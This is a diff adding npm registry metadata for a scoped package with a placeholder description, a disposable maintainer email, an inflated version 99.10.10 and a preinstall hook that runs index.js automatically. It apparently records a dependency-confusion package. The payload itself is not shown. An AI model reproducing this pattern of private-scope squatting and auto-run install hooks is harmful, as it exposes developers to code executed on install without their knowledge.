@@ -1,0 +1,62 @@
+{
+    "_id": "@bynder-private/persistgraphql-webpack-plugin",
+    "name": "@bynder-private/persistgraphql-webpack-plugin",
+    "dist-tags": {
+        "latest": "99.10.10"
+    },
+    "versions": {
+        "99.10.10": {
+            "name": "@bynder-private/persistgraphql-webpack-plugin",
+            "version": "99.10.10",
+            "description": "bynder package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "@bynder-private/persistgraphql-webpack-plugin@99.10.10",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-gVohCSB5fHlFDOIVqW2EtM6DA4LQNmUiNmZCKYNWTar0B+RXO3ELMNBJaqI0tsMgZ467xNAtJDBrD5hfDKxPTA==",
+                "shasum": "80384c728333d820af77f61a4639b205a9e6f1a8",
+                "tarball": "https://registry.npmjs.org/@bynder-private/persistgraphql-webpack-plugin/-/persistgraphql-webpack-plugin-99.10.10.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5096,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiMirYACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpnlg//fm6rVxBtK6AxRhp9WOX/AGsf/XDK42+s4KNomh2FoahFO4hH\r\nkolosQTaCnMwGdy7NynKxqXIHzSobYlOz4Awm2XswWlUECGSyAUqwYXLHYnt\r\nVDE8Na6oprBrS6GhsV7O942kdEWAXY3q+17j35iBkG5ZP8XGyqqQYIv0RPb3\r\nvjnpCAkPLbzCqXm5QCjEybpheYiTpyTMs/+Pb+pAdA0x72T79y88lv7l8UGl\r\nrhPjUoh1TNfInlNk7JcBSp0WmhX4acJtEKyyK370EK6UFUiZkWgzqUF16u0n\r\nOElCvoWaGnsQ6C+84XXCkxo9inJ7ss8fDMLed0my6nZHNOKSAZ7J8O9zz/I8\r\nJx4CkuH/nuE1fSOEHUS2itp4tPVq52gnPyKqLgo9kD9bPXSFrmPKoWNhNgYU\r\nwxMf62gfEZQkwVbARBSF6ngXApllVB8BY/IBdTOFt759drw0mzQRRZy/g8uT\r\nvCr9ZOoxDh3IOSPMnwNrBCN7r6ySDleHhcf3uGybZrhG1ww/8Eqk5O5xi9MI\r\ncPZi67AFLklBKNqdFk079C+/Rry0OpWn3hgKCTlzle+fLhJ7+CD48a46TMJ0\r\nbiHoXZLBy1SXQH0fHw/ozmtyPRlpw64vUqVeEVOUsGU6kf6RaQQE5UVaQJPW\r\npvl95D0UuF/0LNvdK0RB1uwcJPdV5oBkfSA=\r\n=fKCi\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "bynder-private",
+                "email": "bynder-private@rt11.33mail.com"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "bynder-private",
+                    "email": "bynder-private@rt11.33mail.com"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/persistgraphql-webpack-plugin_99.10.10_1647454936170_0.657034282725663"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-16T18:22:16.103Z",
+        "99.10.10": "2022-03-16T18:22:16.417Z",
+        "modified": "2022-03-16T18:22:16.511Z"
+    },
+    "maintainers": [
+        {
+            "name": "bynder-private",
+            "email": "bynder-private@rt11.33mail.com"
+        }
+    ],
+    "description": "bynder package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
